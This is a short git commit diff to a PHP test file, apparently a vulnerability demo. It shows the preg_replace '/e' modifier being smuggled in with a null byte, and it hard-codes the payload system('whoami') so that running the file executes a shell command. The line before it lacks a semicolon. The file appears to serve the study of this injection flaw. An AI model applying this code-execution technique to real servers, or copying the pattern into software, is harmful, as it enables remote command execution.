3e549398eb05c1e2b78027175c1b4eb594397b4b
msharm33 <42849159+msharm33@users.noreply.github.com>
2018-12-01 09:48:52 -0500

    Update vuln_test_execute.php

--- vuln_test_execute.php
+++ vuln_test_execute.php
@@ -1,7 +1,12 @@
 <?php
 $searchStr = 'This is a test string.'
+// Without Null Character
+  //$toReplace = "test/e";
+// The upper won't work
+  
 $toReplace = "test/e\0";
-$replaceWith = $_GET['replacewith'];
+
+$replaceWith = "system('whoami')";
 
 echo preg_replace('/'.$toReplace.'/', $replaceWith, $searchStr);
 ?>
